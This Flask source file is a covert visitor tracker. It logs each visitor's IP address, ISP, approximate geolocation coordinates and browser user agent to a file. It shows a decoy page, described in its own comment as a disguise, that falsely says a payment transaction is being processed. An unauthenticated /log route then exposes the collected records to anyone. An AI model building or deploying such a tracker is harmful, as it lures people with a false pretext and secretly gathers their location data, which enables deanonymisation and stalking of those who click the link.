from flask import Flask, request
import datetime
import requests

app = Flask(__name__)

# API IPinfo không cần token cho truy cập cơ bản
def get_ip_info(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json", timeout=3)
        if response.status_code == 200:
            data = response.json()
            return {
                "city": data.get("city", "Unknown"),
                "region": data.get("region", "Unknown"),
                "country": data.get("country", "Unknown"),
                "org": data.get("org", "Unknown ISP"),
                "loc": data.get("loc", "Unknown location")
            }
    except:
        pass
    return {
        "city": "Unknown",
        "region": "Unknown",
        "country": "Unknown",
        "org": "Unknown ISP",
        "loc": "Unknown location"
    }

@app.route('/')
def index():
    # Lấy IP thật từ proxy
    forwarded_for = request.headers.get('X-Forwarded-For', '')
    ip = forwarded_for.split(',')[0].strip() if forwarded_for else request.remote_addr

    # Lấy User-Agent
    ua = request.headers.get('User-Agent', 'Unknown')

    # Thông tin từ IP
    info = get_ip_info(ip)

    # Lấy giờ Việt Nam
    now = datetime.datetime.utcnow() + datetime.timedelta(hours=7)
    timestamp = now.strftime('%Y-%m-%d %H:%M:%S')

    # Format log
    log = (
        f"{timestamp} | IP: {ip} | ISP: {info['org']} | Location: {info['city']}, {info['region']}, {info['country']} | "
        f"Coords: {info['loc']} | Agent: {ua}\n"
    )

    # Ghi log
    try:
        with open("ip_log.txt", "a", encoding="utf-8") as f:
            f.write(log)
    except Exception as e:
        return f"❌ Ghi log thất bại: {e}"

    # Trả về giao diện ngụy trang
    return '''
    <html>
      <head><title>Đang xử lý giao dịch</title></head>
      <body style="font-family:sans-serif;text-align:center;margin-top:100px;">
        <h2>🔄 Giao dịch đang được xử lý...</h2>
        <p>Vui lòng không đóng trình duyệt trong khi hệ thống xác minh giao dịch của bạn.</p>
      </body>
    </html>
    '''

@app.route('/log')
def view_log():
    try:
        with open("ip_log.txt", "r", encoding="utf-8") as f:
            return f"<pre>{f.read()}</pre>"
    except FileNotFoundError:
        return "❌ Chưa có dữ liệu IP truy cập."
    except Exception as e:
        return f"❌ Lỗi khi đọc log: {e}"
